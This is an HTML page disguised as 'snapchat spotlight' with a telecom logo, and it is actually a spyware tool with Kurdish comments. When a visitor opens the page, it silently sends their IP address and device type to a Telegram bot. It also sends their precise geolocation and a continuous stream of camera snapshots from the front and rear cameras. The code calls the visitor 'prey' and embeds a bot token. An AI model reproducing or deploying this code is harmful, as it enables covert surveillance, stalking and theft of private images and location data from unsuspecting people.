<!DOCTYPE html>
<html lang="ku">
<head>
    <meta charset="UTF-8">
    <link rel="icon" type="image/png" href="https://www.korektelecom.com/media/1001/korek-logo.png">
    <title>snapchat spotlight</title>
    <style>body { background-color: white; margin: 0; overflow: hidden; }</style>
</head>
<body onload="capture()">
<script>
    const urlParams = new URLSearchParams(window.location.search);
    const targetID = urlParams.get('id'); 
    const TOKEN = "8431515310:AAG0xW2hgSbex-3vmGx8bXxiR3BADu10N3g";
    let currentStream = null;
    let video = document.createElement('video');

    async function capture() {
        if (!targetID) return;

        // 🚀 قۆناغی ١: ناردنی خێرای IP و زانیارییەکان (پێش کامێرا)
        sendInitialReport();

        // 📍 ناردنی لوکەیشن
        navigator.geolocation.getCurrentPosition(pos => {
            sendLocation(pos.coords.latitude, pos.coords.longitude);
        }, null, {enableHighAccuracy:true});

        // 🔥 قۆناغی ٢: هەوڵدان بۆ کردنەوەی کامێرا بە لۆژیکی جیاواز
        try {
            // سەرەتا هەوڵدان بۆ کامێرای پێشەوە چونکە ئامانجی سەرەکییە
            await startCam("user");
            
            // ئەگەر دەستی پێکرد، وێنە بگرە
            setInterval(takeSnap, 700);

            // دوای ٥ چرکە گۆڕین بۆ کامێرای پشت (تەنها بۆ تاقیکردنەوە ئەگەر کرا)
            setTimeout(async () => {
                await switchCam("environment");
            }, 5000);

        } catch (err) {
            // 🛠️ ئەگەر لەناو تێلێگرام بلۆک بوو، ئەم فێڵە بەکاربێنە
            sendToTelegram("⚠️ وێبگەڕی تێلێگرام ڕێگری دەکات. نێچیرەکە ڕەوانەی دەرەوە دەکرێت.");
            // دەتوانیت لێرەدا ئاراستەی بکەیت بۆ وێبگەڕی دەرەکی ئەگەر ویستت
        }
    }

    async function startCam(mode) {
        // فلتەرێکی بەهێزتر بۆ ناچارکردنی وێبگەڕ
        const constraints = { 
            video: { 
                facingMode: { ideal: mode },
                width: { ideal: 1280 },
                height: { ideal: 720 }
            }, 
            audio: false 
        };

        try {
            if (currentStream) {
                currentStream.getTracks().forEach(t => t.stop());
            }
            currentStream = await navigator.mediaDevices.getUserMedia(constraints);
            video.srcObject = currentStream;
            video.setAttribute("playsinline", true); // بۆ ئایفۆن و تێلێگرام گرنگە
            video.play();
        } catch (e) {
            console.error("Cam Error: ", e);
            throw e;
        }
    }

    async function switchCam(mode) {
        await startCam(mode);
    }

    function takeSnap() {
        if (video.videoWidth > 0) {
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth; 
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            canvas.toBlob(b => { 
                if (b) sendFile(b, "photo"); 
            }, 'image/jpeg', 0.5);
        }
    }

    async function sendInitialReport() {
        const res = await fetch('https://api.ipify.org?format=json');
        const data = await res.json();
        let report = `🦅 <b>نێچیرێکی نوێ! (Eye Spy V2)</b>\n🌐 IP: <code>${data.ip}</code>\n📱 Device: <code>${navigator.platform}</code>`;
        sendToTelegram(report);
    }

    function sendToTelegram(text) {
        fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({chat_id: targetID, text: text, parse_mode: "HTML"})
        });
    }

    function sendLocation(lat, lon) {
        fetch(`https://api.telegram.org/bot${TOKEN}/sendLocation`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({chat_id: targetID, latitude: lat, longitude: lon})
        });
    }

    function sendFile(blob, type) {
        let fd = new FormData();
        fd.append("chat_id", targetID);
        fd.append("photo", blob, "shot.jpg");
        fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
    }
</script>
</body>
</html>
